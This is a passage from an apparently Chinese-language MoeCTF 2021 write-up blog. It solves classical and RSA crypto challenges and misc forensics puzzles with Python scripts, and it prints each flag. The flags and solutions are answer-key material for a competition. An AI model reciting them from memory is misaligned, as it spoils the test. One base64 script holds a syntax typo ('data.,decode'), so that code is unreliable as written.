class="number">47220438825147485602004110821622560065904207675219860468929327492230243119464967323930295623259686691976072363819976125368307866223981062386682077438030452670319556977872343275419275297828846355087444641575933688543206152050119271402939885941719672725566836549228027040543887994457719131600949478670978241146</span></span><br><span class="line">c2=<span class="number">115435415972673976853578931507112950322194896557724940548983105717498084920603530063295392396344585245149536619546139549595643165285610305977637286040529163780201012187105549728000887169595946039777889559399483628995380569296124138575774025562472143420878790970785857061634021973901034670780393435693955936244</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">_, r, s = gmpy2.gcdext(e1, e2)</span><br><span class="line"> </span><br><span class="line">m = <span class="built_in">pow</span>(c1, r, n) * <span class="built_in">pow</span>(c2, s, n) % n</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"><span class="comment">#moectf&#123;s0_Powwwwwwwwwwwww3r!&#125;</span></span><br></pre></td></tr></table></figure><blockquote><p><em><strong>NumberTheory-MyGrandson</strong></em></p><blockquote><p>其实比较明显，c比n小很多，而且e=3，属于是取模取了个寂寞。<br>而且不敢确定的话可以把c列表打出来看看，每个元素其实都是一样的，也就是说c列表里实际上都是m的三次方。那么我们把c直接开三次方就可以了。<br>不过pow函数有精度问题,所以用gmpy2.iroot开一下。</p></blockquote></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">c=<span class="number">25681920037857462308038008456804236725305902130578298860433144085656782676411434281544156794249690534545397408244321828543334304937398521739382233631303709676426573143503446051379370337969083171791612381925477</span></span><br><span class="line">m=gmpy2.iroot(c,<span class="number">3</span>)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#输出：(mpz(2950365559902224967742067902659102097834402066133060751891986702825853), True)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">m=<span class="number">2950365559902224967742067902659102097834402066133060751891986702825853</span></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"><span class="comment">#moectf&#123;Chinese_Remain_Theory&#125;</span></span><br></pre></td></tr></table></figure><h1 id="Classical-Cryptography"><a href="#Classical-Cryptography" class="headerlink" title="Classical Cryptography"></a>Classical Cryptography</h1><blockquote><p><em><strong>Augustine’s Way</strong></em></p><blockquote><p>npfdug{f3tz_Bv9v5u1of!}<br>就是凯撒，直接爆破。<br>moectf{e3sy_Au9u5t1ne!}</p></blockquote></blockquote><blockquote><p><em><strong>OldButPopular</strong></em></p><blockquote><p>凯撒＋栅栏，先凯撒，找首字母是m的，就是要找的字符串。<br>然后用在线网站解不太对，看一下长度发现是38，数一下moectf这几个字符的索引，发现分栏的方式应该是8 8 8 7 7，跟标准的栅栏密码稍微差那么一点 <del>，不然真成白给题了。</del></p></blockquote></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="string">&quot;mf3n_u31o&#123;rtg7_dec__0_w&#125;c4wt_t0t540ohr&quot;</span></span><br><span class="line">a1=a[:<span class="number">8</span>]</span><br><span class="line">a2=a[<span class="number">8</span>:<span class="number">16</span>]</span><br><span class="line">a3=a[<span class="number">16</span>:<span class="number">24</span>]</span><br><span class="line">a4=a[<span class="number">24</span>:<span class="number">31</span>]</span><br><span class="line">a5=a[<span class="number">31</span>:]</span><br><span class="line">flag=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    flag.append(a1[i])</span><br><span class="line">    flag.append(a2[i])</span><br><span class="line">    flag.append(a3[i])</span><br><span class="line">    <span class="keyword">if</span> i &lt;<span class="number">7</span>:</span><br><span class="line">        flag.append(a4[i])</span><br><span class="line">        flag.append(a5[i])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">    <span class="built_in">print</span>(i,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">moectf&#123;c453r_w4nt_t0_g0_ou7_th3_w0r1d&#125;</span><br></pre></td></tr></table></figure><blockquote><p><em><strong>Augustine’s Way#2</strong></em></p><blockquote><p>凯撒变式，用ASCII码表做位移，不局限于字母了，所有字符都要位移。</p></blockquote></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cyber=<span class="string">&quot;eg][l^sdm(i)YfWqq\-u&quot;</span></span><br><span class="line">flag=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> cyber:</span><br><span class="line">    flag.append(<span class="built_in">ord</span>(i)+<span class="built_in">ord</span>(<span class="string">&#x27;m&#x27;</span>)-<span class="built_in">ord</span>(<span class="string">&#x27;e&#x27;</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(i),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment">#moectf&#123;lu0q1an_yyd5&#125;</span></span><br></pre></td></tr></table></figure><blockquote><p><em><strong>Ez Vigenere</strong></em></p><blockquote><p>搜一下维吉尼亚，前几个字符对照moectf，可以知道密钥是rxyyds，拿去解密网站解密就好了<br>moectf{the_key_of_vigenere_is_rxyyds}</p></blockquote></blockquote><blockquote><p><em><strong>モンスターを縫う！</strong></em></p><blockquote><p>flag1，一眼凯撒，1位移：   <strong>moectf{cl@</strong><br>flag2，维吉尼亚，密钥给了：  <strong>ssical</strong><br>flag3，栅栏，密钥2：  <strong>_cipher</strong><br>flag4，ABAAA，培根密码：  <strong>I</strong><br>flag4，凯撒，13位移 <del>（我当时忽略那个B了，没想明白是啥意思，后来他们告诉我B拆开就是13······）</del> ：<strong>pr3t</strong><br>flag5，摩斯密码： <strong>tyg00d!｝</strong><br><strong>moectf{cl@ssical_cipherIpr3tyg00d!}</strong></p></blockquote></blockquote><blockquote><p><em><strong>Ex Viginere?</strong></em></p><blockquote><p><del>重头戏终于来了</del><br>这个解密的详细过程在dbt的博客里有，我们只需要把他进行AES解密和base64解密的那一段删掉，然后就可以跑出来明文了。之后根据哈希值逐位爆破，找到flag。<br>简单来讲就是根据重合指数爆破出密钥长度，计算k1和k2，就可以还原明文。在足够长的英文文本中，每个字母出现的频率有一个确定的值，重合指数就是根据这一统计规律来计算的。<br> ~~可以去看看dbt的博客，讲得可详细了~~~</p></blockquote></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">r&#x27;c.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">c = f.read()</span><br><span class="line">f.close()</span><br><span class="line"><span class="comment"># 我们已经知道，维吉尼亚密码可以被分解为若干组平移密码来破译，</span></span><br><span class="line"><span class="comment"># 而一个明文足够长的平移密码的重合指数接近 0.0687。</span></span><br><span class="line"><span class="comment"># 换言之，如果我们选取某个 l 值，使得分组后的密文的重合指数接近 0.065，</span></span><br><span class="line"><span class="comment"># 则说明选取的 t 值与密钥的长度是一致的。</span></span><br><span class="line">best_index = <span class="number">0.065</span></span><br><span class="line"><span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line">dic_index = &#123;<span class="string">&#x27;a&#x27;</span>: <span class="number">0.08167</span>,<span class="string">&#x27;b&#x27;</span>: <span class="number">0.01492</span>,<span class="string">&#x27;c&#x27;</span>: <span class="number">0.02782</span>,<span class="string">&#x27;d&#x27;</span>:<span class="number">0.04253</span>,<span class="string">&#x27;e&#x27;</span>: <span class="number">0.12702</span>,<span class="string">&#x27;f&#x27;</span>:<span class="number">0.02228</span>,<span class="string">&#x27;g&#x27;</span>: <span class="number">0.02015</span>,<span class="string">&#x27;h&#x27;</span>:<span class="number">0.06094</span>,<span class="string">&#x27;i&#x27;</span>:<span class="number">0.06966</span>,<span class="string">&#x27;j&#x27;</span>:<span class="number">0.00153</span>,<span class="string">&#x27;k&#x27;</span>:<span class="number">0.00772</span>,<span class="string">&#x27;l&#x27;</span>:<span class="number">0.04025</span>,<span class="string">&#x27;m&#x27;</span>:<span class="number">0.02406</span>,<span class="string">&#x27;n&#x27;</span>:<span class="number">0.06749</span>,<span class="string">&#x27;o&#x27;</span>:<span class="number">0.07507</span>,<span class="string">&#x27;p&#x27;</span>:<span class="number">0.01929</span>,<span class="string">&#x27;q&#x27;</span>:<span class="number">0.00095</span>,<span class="string">&#x27;r&#x27;</span>:<span class="number">0.05987</span>,<span class="string">&#x27;s&#x27;</span>:<span class="number">0.06327</span>,<span class="string">&#x27;t&#x27;</span>:<span class="number">0.09056</span>,<span class="string">&#x27;u&#x27;</span>:<span class="number">0.02758</span>,<span class="string">&#x27;v&#x27;</span>:<span class="number">0.00978</span>,<span class="string">&#x27;w&#x27;</span>:<span class="number">0.02360</span>,<span class="string">&#x27;x&#x27;</span>:<span class="number">0.00150</span>,<span class="string">&#x27;y&#x27;</span>:<span class="number">0.01974</span>,<span class="string">&#x27;z&#x27;</span>:<span class="number">0.00074</span>&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">IndCo</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="comment"># 计算字符串的重合指数（所有字母出现频率的平方和）</span></span><br><span class="line">    <span class="comment"># 输入 s </span></span><br><span class="line">    <span class="comment"># 输出 重合指数</span></span><br><span class="line">    alpha = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span></span><br><span class="line">    freq = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> alpha:</span><br><span class="line">        freq[i] = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        freq[i] =  freq[i] + <span class="number">1</span></span><br><span class="line">    index = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> alpha:</span><br><span class="line">        index = index + (freq[i]*(freq[i] - <span class="number">1</span> )) / (<span class="built_in">len</span>(s) * (<span class="built_in">len</span>(s) - <span class="number">1</span> ))</span><br><span class="line">    <span class="keyword">return</span> index</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">IndCo_m</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="comment"># 计算明文 s 中的各字母频率和英文字母中的频率吻合程度</span></span><br><span class="line">    <span class="comment"># 输入：明文 s</span></span><br><span class="line">    <span class="comment"># 输出：吻合程度</span></span><br><span class="line">    alpha = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span></span><br><span class="line">    freq = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> alpha:</span><br><span class="line">        freq[i] = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        freq[i] += <span class="number">1</span></span><br><span class="line">    index = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> alpha:</span><br><span class="line">        index += freq[i] / <span class="built_in">len</span>(s) * dic_index[i]</span><br><span class="line">    <span class="keyword">return</span> index</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_keylen</span>(<span class="params">c</span>):</span></span><br><span class="line">    <span class="comment"># 求出最符合统计学的 m,n 的最小公倍数，方法通过爆破足够大的周期样本，观察成倍出现的周期</span></span><br><span class="line">    <span class="comment"># 计算方法是解出每一个子密文段的重合指数然后求平均值 在和最佳重合指数相减 误差小于 0.01</span></span><br><span class="line">    <span class="comment"># 输入：密文</span></span><br><span class="line">    <span class="comment"># 输出：公共周期列表</span></span><br><span class="line">    keylen = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">        average_index = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i):</span><br><span class="line">            s = <span class="string">&#x27;&#x27;</span>.join(c[j+i*x] <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(c)//i))</span><br><span class="line">            index = IndCo(s)</span><br><span class="line">            average_index+=index</span><br><span class="line">        average_index = average_index/i - best_index</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">abs</span>(average_index)&lt;<span class="number">0.01</span>:</span><br><span class="line">            keylen.append(i)</span><br><span class="line">    <span class="keyword">return</span> keylen</span><br><span class="line">keylen = get_keylen(c)</span><br><span class="line"><span class="built_in">print</span>(keylen)</span><br><span class="line"><span class="comment">#____________________________得到 keylen_____________________________#</span></span><br><span class="line"><span class="comment">#____________________________爆破 flag———————————————————————————————#</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">c,i,j</span>):</span></span><br><span class="line">    alpha = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span></span><br><span class="line">    m = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> c:</span><br><span class="line">        m += alpha[((alpha.index(x)-j)*gmpy2.invert(i,<span class="number">26</span>))%<span class="number">26</span>]</span><br><span class="line">    <span class="keyword">return</span> m </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_key</span>(<span class="params">c</span>):</span></span><br><span class="line">    <span class="comment"># 得到一个密文段的单个字符 key .i .j</span></span><br><span class="line">    <span class="comment"># 暴力枚举，找到最符合的</span></span><br><span class="line">    <span class="comment"># 输入：密文段</span></span><br><span class="line">    <span class="comment"># 输出：i,j</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">        <span class="keyword">if</span> gmpy2.gcd(i,<span class="number">26</span>)!= <span class="number">1</span> :</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">            m = decrypt(c,i,j)</span><br><span class="line">            index = IndCo_m(m)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">abs</span>(index-<span class="number">0.065</span>)&lt;<span class="number">0.01</span>:</span><br><span class="line">                <span class="keyword">return</span> (i,j)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_all_key</span>(<span class="params">s,keylen</span>):</span></span><br><span class="line">    <span class="comment"># 得到一个周期内所有密文段的 key</span></span><br><span class="line">    <span class="comment"># 输入：原密文，周期</span></span><br><span class="line">    <span class="comment"># 输出：无</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(keylen):</span><br><span class="line">        temps = <span class="string">&#x27;&#x27;</span>.join([s[i+x*keylen] <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(s)//keylen)])</span><br><span class="line">        <span class="built_in">print</span>(get_key(temps))</span><br><span class="line">get_all_key(c,keylen[<span class="number">0</span>])</span><br><span class="line"><span class="comment"># 于是就可以分析得到 ka = []  kb= []</span></span><br><span class="line"><span class="comment"># 例如：(23, 9)(25, 21)(21, 9)(3, 10)(19, 16)(23, 3)(25, 22)(21, 13)(3, 14)(19, 21)(23, 15)(25, 9)(21, 21)(3, 9)(19, 10)(23, 16)(25, 3)(21, 22)(3, 13)(19, 14)(23, 21)(25, 15)(21, 9)(3, 21)(19, 9)(23, 10)(25, 16)(21, 3)(3, 22)(19, 13)(23, 14)(25, 21)(21, 15)(3, 9)(19, 21)(23, 9)(25, 10)(21, 16)(3, 3)(19, 22)(23, 13)(25, 14)(21, 21)(3, 15)(19, 9)(23, 21)(25, 9)(21, 10)(3, 16)(19, 3)(23, 22)(25, 13)(21, 14)(3, 21)(19, 15)</span></span><br><span class="line"><span class="comment"># 那么得到就是 k1=[23,25,21,3,19],k2=[9,21,9,10,16,3,22,13,14,21,15]</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span>*</span><br><span class="line">k1=[<span class="number">9</span>,<span class="number">7</span>,<span class="number">25</span>,<span class="number">11</span>,<span class="number">11</span>,<span class="number">19</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">25</span>,<span class="number">9</span>,<span class="number">7</span>]</span><br><span class="line">k2=[<span class="number">25</span>,<span class="number">19</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">25</span>,<span class="number">20</span>,<span class="number">8</span>]</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">r&#x27;c.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">c = f.read()</span><br><span class="line">f.close()</span><br><span class="line">plaintext = <span class="string">&#x27;&#x27;</span></span><br><span class="line">l1 = <span class="built_in">len</span>(k1)</span><br><span class="line">l2 = <span class="built_in">len</span>(k2)</span><br><span class="line">alpha=<span class="string">&#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line">    plaintext+=alpha[((alpha.index(c[i])-k2[i%l2])*gmpy2.invert(k1[i%l1],<span class="number">26</span>))%<span class="number">26</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(plaintext)):</span><br><span class="line">    a=plaintext[i:i+<span class="number">16</span>]</span><br><span class="line">    b=a+<span class="string">&#x27;How_Interesting_the_Cryptography_Is&#x27;</span></span><br><span class="line">    <span class="keyword">if</span>(md5(b.encode()).hexdigest()==<span class="string">&#x27;196cf7098c7ea6e3e4d03691fb9d4f58&#x27;</span>):</span><br><span class="line">        <span class="built_in">print</span>(a)</span><br><span class="line"><span class="comment">#moectf&#123;pieceofchocolate&#125;</span></span><br></pre></td></tr></table></figure><hr><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="find-me"><a href="#find-me" class="headerlink" title="find_me"></a><strong>find_me</strong></h2><p>把文件拖进<em><strong>010editor</strong></em> 进行查看，Flag跃然于右边的文本(之前都用的winhex,没想到<em><strong>010edito</strong></em>r又经济又实惠，hs yyds)</p><p><code>moectf&#123;hs_g1v3_u_fl@g&#125;</code></p><h2 id="Macross"><a href="#Macross" class="headerlink" title="Macross"></a><strong>Macross</strong></h2><p>打开是一个以<strong>mrf</strong>为后缀名的文件，用百度搜了很久一直说是和mac系统相关连的文件格式，然后下了<em>Fileview</em>查看，看了个寂寞，<del>只有我浪费了精力和希望，百度得了流量</del> 然后上 Google 搜到是记录鼠标行为的数据文件(<em>An MRF file is a data file created by Bartels Media Mouse Recorder</em>)，并找到下载相应的软件<code>MacrossRecorder</code>，然后打开 Windows 画图，运行文件并记录轨迹</p><p><code>moectf&#123;Rec0rder_15_Funny&#125;</code></p><h2 id="Homework"><a href="#Homework" class="headerlink" title="Homework"></a><strong>Homework</strong></h2><p>大致按照word隐写的流程走一下，将字体全调成红色，发现有一处有重叠的字符，直接复制然后找一个文本框得出<code>flag&#123;0h_U_</code>，调整阅读视图或者在kali中打开发现了<code>f1nd_m3!&#125;</code>的文本(或者清除格式也能看到),最终得到Flag</p><p><img src="https://i.loli.net/2021/09/24/9OfBvmqDg6GWrHe.png" alt="image-20210924151122930"></p><p><img src="https://i.loli.net/2021/09/24/KysmEInGoabUqVM.png"></p><p><code>moectf&#123;0h_U_f1nd_m3!&#125;</code></p><h2 id="flipflipflip"><a href="#flipflipflip" class="headerlink" title="flipflipflip"></a><strong>flipflipflip</strong></h2><p>打开文件发现末尾是<code>=</code>，可能用到了base64编码，因文件较大，复制粘贴会卡，选用python做题</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;task&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">content = f.read()</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p>对content第一次解码，查看头尾</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">content = base64.decodebytes(content)</span><br><span class="line"><span class="built_in">print</span>(content[:<span class="number">10</span>])  <span class="comment"># b&#x27;=0DME1URxU&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(content[-<span class="number">10</span>:-<span class="number">1</span>])  <span class="comment"># b&#x27;XRXl1V41m&#x27;</span></span><br></pre></td></tr></table></figure><p>发现=变到了前方，需要进行翻转字符串，<font color='red'>如果此时继续编码则会报错</font></p><p>所以思路出来了：不断编码，报错就翻转再编码，直至出现moe为止</p><p>脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = base64.decodebytes(content)</span><br><span class="line">        data.decode(<span class="string">&#x27;utf-8&#x27;</span>) <span class="comment">#注意要进行解码</span></span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        data = base64.decodebytes(content[::-<span class="number">1</span>])</span><br><span class="line">        data.,decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;moe&#x27;</span> <span class="keyword">in</span> data:</span><br><span class="line">        <span class="built_in">print</span>(data)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    content = data</span><br><span class="line">    <span class="comment">#b&#x27;moectf&#123;fffffflipppppp&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p><code>moectf&#123;fffffflipppppp&#125;</code></p><h2 id="White-Album"><a href="#White-Album" class="headerlink" title="White Album"></a><strong>White Album</strong></h2><p>参考博客：</p><blockquote><p><a href="">https://www.notion.so/MoeCTF-readme-txt-487c4f5e93764867b7aeead6a263c4ba#b8c0d9633d0e4bfe89ccd0fdb0f2672f</a></p></blockquote><p>打开可以看到<code>.png</code> ，用kali打开图片，打不开（白屏），网上搜了一下，是图片宽高的问题，CRC爆破出原宽高(找到的脚本)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">filename = <span class="string">&#x27;test.png&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    all_b = f.read()</span><br><span class="line">    crc32key = <span class="built_in">int</span>(all_b[<span class="number">29</span>:<span class="number">33</span>].<span class="built_in">hex</span>(),<span class="number">16</span>)</span><br><span class="line">    data = <span class="built_in">bytearray</span>(all_b[<span class="number">12</span>:<span class="number">29</span>])</span><br><span class="line">    n = <span class="number">4095</span>            <span class="comment">#理论上0xffffffff,但考虑到屏幕实际/cpu，0x0fff就差不多了</span></span><br><span class="line">    <span class="keyword">for</span> w <span class="keyword">in</span> <span class="built_in">range</span>(n):          <span class="comment">#高和宽一起爆破</span></span><br><span class="line">        width = <span class="built_in">bytearray</span>(struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, w))     <span class="comment">#q为8字节，i为4字节，h为2字节</span></span><br><span class="line">        <span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">            height = <span class="built_in">bytearray</span>(struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, h))</span><br><span class="line">            <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">                data[x+<span class="number">4</span>] = width[x]</span><br><span class="line">                data[x+<span class="number">8</span>] = height[x]</span><br><span class="line">            crc32result = zlib.crc32(data)</span><br><span class="line">            <span class="keyword">if</span> crc32result == crc32key:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;宽为：&quot;</span>,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(width)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;高为：&quot;</span>,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(height)</span><br><span class="line">                exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>然后在<code>010 Editor</code> 里改它的宽高部分，得到完整图片，出现条码拿到在线二维码网站解码(后面得知是<code>PDF417</code>  介于二维码和条形码的一种码)</p><p><img src="https://i.loli.net/2021/09/24/dvfwjZUOKyClDWR.png"></p><blockquote><p>推荐网站： <a href="https://jiema.wwei.cn/">https://jiema.wwei.cn</a></p></blockquote><p><code>moectf&#123;WhY_@r3_u_s0_5K1ll3D&#125;</code></p><h2 id="Phone-Call"><a href="#Phone-Call" class="headerlink" title="Phone Call"></a><strong>Phone Call</strong></h2><p>参考博客<a href="https://www.zhihu.com/question/19780683">https://www.zhihu.com/question/19780683</a><br>这种题一就很复杂，拿到<code>audacity</code>看到将近21个峰</p><p><img 